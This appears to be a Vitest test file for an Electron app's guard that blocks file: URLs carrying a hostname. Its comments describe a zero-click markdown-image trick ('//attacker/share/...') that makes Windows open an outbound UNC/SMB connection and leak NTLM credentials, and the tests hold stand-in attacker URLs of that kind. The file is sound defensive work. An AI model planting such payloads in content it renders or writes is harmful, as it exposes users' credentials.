// 安全:拒绝带主机名的 file: 请求(Windows 上即 UNC/SMB 外连 → NTLM 凭据泄露)。
// 攻击:markdown `![](//attacker/share/x.png)` 在 file:// 页面下解析为 file://attacker/share/x.png,
// CSP img-src 'self' 在 file: 页面下放行任意 file: URL(实测),渲染即触发零点击外连。
import { readdirSync, readFileSync } from 'node:fs';
import path from 'node:path';
import { describe, expect, it, vi } from 'vitest';
import {
  installFileRequestGuard,
  isBlockedFileRequest,
} from '../lib/file-request-policy';

describe('isBlockedFileRequest', () => {
  it('本地 file:///(空 host)放行:应用入口 / macOS / Windows 盘符路径', () => {
    for (const url of [
      'file:///Users/x/out-pack/renderer/index.html',
      'file:///Users/x/a.png',
      'file:///C:/Program%20Files/Continuo/resources/app/index.html',
    ]) {
      expect(isBlockedFileRequest(url)).toBe(false);
    }
  });

  it('带主机名的 file: 请求拒:UNC 外连 / localhost / IP / WebDAV @SSL', () => {
    for (const url of [
      'file://attacker/share/x.png',
      'file://attacker.example.com/share/x.png',
      'file://ATTACKER/share/x.png',
      'file://10.0.0.1/share/x.png',
      'file://attacker@SSL/share/x.png',
      'file://localhost/etc/hosts',
    ]) {
      expect(isBlockedFileRequest(url)).toBe(true);
    }
  });

  it('非 file 协议不处理(交给 CSP / 其它守卫)', () => {
    for (const url of ['https://example.com/x.png', 'http://localhost:5173/', 'data:image/png;base64,AA', 'blob:file:///x']) {
      expect(isBlockedFileRequest(url)).toBe(false);
    }
  });

  it('畸形 authority(WHATWG 解析会抛)→ 仍按非空 host 拒', () => {
    expect(isBlockedFileRequest('file://[bad/x')).toBe(true);
  });
});

describe('installFileRequestGuard', () => {
  function install() {
    const onBeforeRequest = vi.fn();
    installFileRequestGuard({ webRequest: { onBeforeRequest } } as never);
    const [filter, listener] = onBeforeRequest.mock.calls[0]! as [
      { urls: string[] },
      (d: { url: string }, cb: (r: { cancel?: boolean }) => void) => void,
    ];
    return { filter, listener };
  }

  it('只对 file: 请求注册,UNC 取消、本地放行', () => {
    const { filter, listener } = install();
    expect(filter.urls).toEqual(['file://*/*']);
    const cb = vi.fn();
    listener({ url: 'file://attacker/share/x.png' }, cb);
    listener({ url: 'file:///Users/x/index.html' }, cb);
    expect(cb.mock.calls).toEqual([[{ cancel: true }], [{ cancel: false }]]);
  });

  it('index.ts 在 whenReady 内、首窗创建前对 defaultSession 注册', () => {
    const src = readFileSync(path.join(__dirname, '../index.ts'), 'utf8');
    const ready = src.indexOf('app.whenReady()');
    const reg = src.indexOf('installFileRequestGuard(session.defaultSession)');
    const firstWin = src.indexOf('createMainWindow({', ready);
    expect(ready).toBeGreaterThan(-1);
    expect(reg).toBeGreaterThan(ready);
    expect(reg).toBeLessThan(firstWin);
  });

  it('主进程别处不得再注册 onBeforeRequest(同 session 同事件后注册会覆盖本守卫)', () => {
    const root = path.join(__dirname, '..');
    const offenders = (readdirSync(root, { recursive: true }) as string[])
      .filter((f) => f.endsWith('.ts') && !f.includes('__tests__') && !f.endsWith('file-request-policy.ts'))
      .filter((f) => readFileSync(path.join(root, f), 'utf8').includes('onBeforeRequest'));
    expect(offenders).toEqual([]);
  });
});
